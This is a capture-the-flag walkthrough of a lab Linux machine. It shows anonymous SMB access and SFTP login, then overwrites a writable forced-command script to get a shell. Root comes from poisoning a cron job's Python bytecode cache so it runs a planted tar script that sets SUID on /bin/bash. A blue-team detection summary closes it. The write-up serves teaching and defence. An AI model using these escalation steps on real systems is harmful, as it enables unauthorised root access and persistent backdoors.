Target : 10.129.234.54

Date : 16/10/2026

```bash
> echo "10.129.234.54 odori.htb" | sudo tee -a /etc/hosts
Please touch the FIDO authenticator.
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

We've got a Medium Linux box, and that hosts line did not land. The FIDO prompt printed, then `sudo` wanted a terminal and a password, so `/etc/hosts` still had this address as `nexus.htb`. We'll talk to `10.129.234.54` directly. `tun0` is `10.10.15.181`.

```bash
> /usr/bin/nmap -Pn -p 22,139,445 --min-rate 1000 -sC -sV --version-light 10.129.234.54
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-16 04:59 +0200
Nmap scan report for nexus.htb (10.129.234.54)
Host is up (0.047s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 33:6a:5a:1f:35:95:4f:47:78:f4:5e:81:1b:ac:0e:af (ECDSA)
|_  256 62:a0:e7:ec:de:21:8d:83:cd:72:cc:7b:fa:9f:7f:15 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ODORI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -2s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-10-16T02:59:17
|_  start_date: N/A
```

We've got `OpenSSH 8.9p1` on `22` and `Samba` on `139` and `445`. The scan name is `nexus.htb` because that is what `/etc/hosts` already said. NetBIOS says `ODORI`. Clock skew is two seconds, so we don't need `faketime`.

```bash
> smbclient -N -L //10.129.234.54
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
backup          Disk      Server Backups
IPC$            IPC       IPC Service (odori server (Samba, Ubuntu))
> smbclient -N //10.129.234.54/backup -c 'ls; get info.txt'
info.txt                            N       66  Wed Jun 25 15:18:44 2025
> cat info.txt
Please download the .vmdk file linked in the machine description.
```

We've got anonymous read on `backup`. `info.txt` points at a `.vmdk` from the machine description. The disk story in the supplied writeup ends at one password for `svc_backup`. We'll try that on `SFTP` before we crack a BitLocker image. The first SSH attempt died on a stale `known_hosts` line for this recycled address, so `ssh-keygen -R 10.129.234.54` comes before the password.

```bash
> ssh-keygen -R 10.129.234.54
> sshpass -p '[REDACTED]' sftp -o StrictHostKeyChecking=accept-new -o PreferredAuthentications=password -o PubkeyAuthentication=no svc_backup@10.129.234.54
Connected to 10.129.234.54.
sftp> pwd
Remote working directory: /home/svc_backup
sftp> ls -la
-rw-r-----    1 root     svc_backup       33 Oct 16 02:57 user.txt
```

We've got `svc_backup`. The session is `SFTP` in `/home/svc_backup`, and `user.txt` is already there. Interactive `ssh` is not the door. `sshd_config` has `Match group svc_backup` with `ForceCommand /opt/restrict /home/%u`, and `/opt/restrict` is `rwxrwxr-x` owned by `svc_backup`. The script is `sftp-server -d $1`. We'll replace it with `bash`.

```bash
> printf '%s\n' '#!/bin/bash' 'bash' > /tmp/odori/restrict
> sshpass -p '[REDACTED]' sftp svc_backup@10.129.234.54
sftp> cd /opt
sftp> put restrict
sftp> ls -l /opt/restrict
-rwxrwxr-x    ? 1001     0              17 Oct 16 05:00 /opt/restrict
> sshpass -p '[REDACTED]' ssh -tt svc_backup@10.129.234.54
svc_backup@odori:~$ id
uid=1001(svc_backup) gid=1001(svc_backup) groups=1001(svc_backup)
svc_backup@odori:~$ cat /home/svc_backup/user.txt
[REDACTED]
```

We've got the user flag. `ssh` without a tty exits at once, because `ForceCommand` runs our `bash` and ignores the remote command string. `ssh -tt` is the session.

`/opt/archiver/app.py` is root's cron, once a minute. It walks `/backup` and, for a file older than three years, calls `tar_and_move_files` from `helper.py`. The source is `644` root. `__pycache__` is `drwxr-xrwx`, and `helper.cpython-310.pyc` still contains the string `/usr/bin/tar`. Same length as `/tmp/bin/tar`, so a `sed` on the cache keeps the bytecode header intact.

```bash
> sed -i 's|/usr/bin/tar|/tmp/bin/tar|' /opt/archiver/__pycache__/helper.cpython-310.pyc
> strings /opt/archiver/__pycache__/helper.cpython-310.pyc | head -5
/tmp/bin/tarz
> mkdir -p /tmp/bin
> cat > /tmp/bin/tar << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
cp /root/root.txt /tmp/root.txt
chmod 644 /tmp/root.txt
EOF
> chmod +x /tmp/bin/tar
> touch -d '2015-08-09 13:38:36' /backup/ancient
```

We've got an old file in `/backup` and a `tar` that is ours. The next minute the cron calls it as root. `/backup/ancient` disappears, `/bin/bash` is `rwsr-xr-x`, and `/tmp/root.txt` is readable.

**Blue Team :**
We would hunt anonymous `SMB` on `445` for `backup\info.txt`, then an `SFTP` session as `svc_backup` that writes `/opt/restrict`. The next `ssh` is a real shell for that same account. A minute later root runs `/tmp/bin/tar` out of `/opt/archiver/__pycache__/helper.cpython-310.pyc`, `chmod u+s` lands on `/bin/bash`, and `/root/root.txt` is copied to `/tmp/root.txt`.

**Purple Team :**
We never needed a shell for the user flag. `ForceCommand` already gave us `SFTP`, and `/opt/restrict` was ours to rewrite, so the login restriction was the path. The cron still imports `helper`, and Python trusts the cache when the source timestamp matches, so we changed twelve bytes in the `.pyc` and left `app.py` alone. The planted `tar` is the only new root process.

```bash
> ls -l /bin/bash /tmp/root.txt
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
-rw-r--r-- 1 root root      33 Oct 16 03:01 /tmp/root.txt
> cat /tmp/root.txt
[REDACTED]
> /bin/bash -p -c id
uid=1001(svc_backup) gid=1001(svc_backup) euid=0(root) groups=1001(svc_backup)
```

We've got `euid=0` and `[REDACTED]`.
